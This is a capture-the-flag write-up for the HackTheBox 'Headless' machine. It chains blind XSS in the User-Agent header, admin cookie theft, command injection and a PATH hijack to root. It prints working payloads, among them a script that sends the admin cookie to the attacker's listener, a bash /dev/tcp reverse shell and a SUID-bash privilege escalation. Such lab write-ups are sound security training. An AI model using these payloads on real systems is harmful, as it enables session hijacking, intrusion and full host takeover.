# Headless

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**Topics:** Blind XSS · Cookie Hijacking · Command Injection · PATH Hijacking

---

## Summary

Headless is an easy Linux machine running a Python Werkzeug web server. The attack chain starts with blind XSS via the `User-Agent` header, which is rendered unsanitized in an admin report panel. The stolen admin cookie grants access to a dashboard vulnerable to command injection, yielding a reverse shell as `dvir`. Privilege escalation abuses a sudo-permitted script that calls `initdb.sh` using a relative path — a textbook PATH hijack to root.

---

## Recon

```bash
nmap -sV -sC -p 22,5000 10.129.15.120
```

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 9.2p1 |
| 5000 | HTTP    | Werkzeug 2.2.2 / Python 3.11.2 |

Port 5000 hosts a Werkzeug development server — a common Python web framework. The page title is "Under Construction" with a single link to `/support`.

Directory fuzzing with ffuf revealed only one accessible route: `/support`.

---

## Enumeration

### /support — Contact Form

The support page exposes a POST form with fields: `fname`, `lname`, `email`, `phone`, `message`.

Submitting a `<script>` tag in the `message` field returned a "Hacking Attempt Detected" page. Critically, this page **rendered the full request headers** — including `User-Agent` — and stated that a report had been sent to an administrator.

```
Your IP address has been flagged, a report with your browser information
has been sent to the administrators for investigation.
```

**Key observation:** The form body is sanitized, but the `User-Agent` header is passed unsanitized into an admin-visible report. This is the blind XSS surface.

---

## Exploitation

### Blind XSS via User-Agent → Cookie Theft

The attack requires two elements simultaneously:
- A tripwire in the body (`<script>test</script>`) to trigger the admin report
- The XSS payload in `User-Agent` to fire when the admin views the report

Start a listener:
```bash
python3 -m http.server 8000
```

Send the payload:
```bash
curl -X POST http://10.129.15.120:5000/support \
  -H 'User-Agent: <script>document.location="http://10.10.16.130:8000/?c="+document.cookie</script>' \
  --data-urlencode "fname=test&lname=test&email=test@test.com&phone=1234567890&message=<script>test</script>"
```

The admin bot reviewed the report within seconds. The listener received:

```
GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1
```

**Why this works:** `document.cookie` is appended to a URL pointing at our server. The admin's browser executes the script and calls home, leaking their session token.

---

### Admin Dashboard — Command Injection

Using the stolen cookie to access `/dashboard`:

```bash
curl http://10.129.15.120:5000/dashboard \
  -H 'Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0'
```

The dashboard exposes a "Generate Report" form with a `date` parameter. Submitting a legitimate date returns `Systems are up and running!` — confirming a backend shell call.

Test for command injection:
```bash
curl -X POST http://10.129.15.120:5000/dashboard \
  -H 'Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0' \
  --data-urlencode "date=2023-09-15; id"
```

Response:
```
Systems are up and running!
uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
```

RCE confirmed as `dvir`. Escalate to a reverse shell:

```bash
# Listener
nc -lvnp 9001

# Payload
curl -X POST http://10.129.15.120:5000/dashboard \
  -H 'Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0' \
  --data-urlencode "date=2023-09-15; bash -c 'bash -i >& /dev/tcp/10.10.16.130/9001 0>&1'"
```

**User flag:** `cat ~/user.txt`

---

## Privilege Escalation — PATH Hijacking

```bash
sudo -l
```

```
User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

Inspect the script:
```bash
cat /usr/bin/syscheck
```

The script uses absolute paths for most commands but calls `initdb.sh` with a relative path:
```bash
./initdb.sh 2>/dev/null
```

This means `syscheck` looks for `initdb.sh` in **whatever directory it is run from**. Since we control our working directory, we can plant a malicious `initdb.sh`.

```bash
cd /tmp
echo '#!/bin/bash' > initdb.sh
echo 'chmod +s /bin/bash' >> initdb.sh
chmod +x initdb.sh

sudo /usr/bin/syscheck

/bin/bash -p
```

```
bash-5.2# whoami
root
```

**Root flag:** `cat /root/root.txt`

---

## Attack Chain

```
nmap → port 5000 Werkzeug
  └── /support form → body sanitized, headers rendered to admin
        └── User-Agent XSS → cookie exfiltrated to HTTP listener
              └── is_admin cookie → /dashboard access
                    └── date param → command injection → RCE as dvir
                          └── sudo syscheck → ./initdb.sh relative path
                                └── malicious initdb.sh in /tmp → SUID bash → root
```

---

## Key Techniques

| Technique | Detail |
|-----------|--------|
| Blind XSS | Payload fires in a context you cannot see directly — confirmed only via callback |
| Header injection | `User-Agent` is a non-obvious injection surface compared to form fields |
| Cookie hijacking | `document.cookie` exfiltrated via `document.location` redirect |
| Command injection | Unsanitized `date` param passed to shell — `;` chains arbitrary commands |
| PATH hijacking | `./initdb.sh` in a sudo script — plant malicious script in CWD |

---

## Tools Used

- nmap, curl, ffuf
- python3 http.server (listener)
- netcat (reverse shell)

---

## References

- [HackTricks — XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [HackTricks — Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [GTFOBins — bash SUID](https://gtfobins.github.io/gtfobins/bash/)
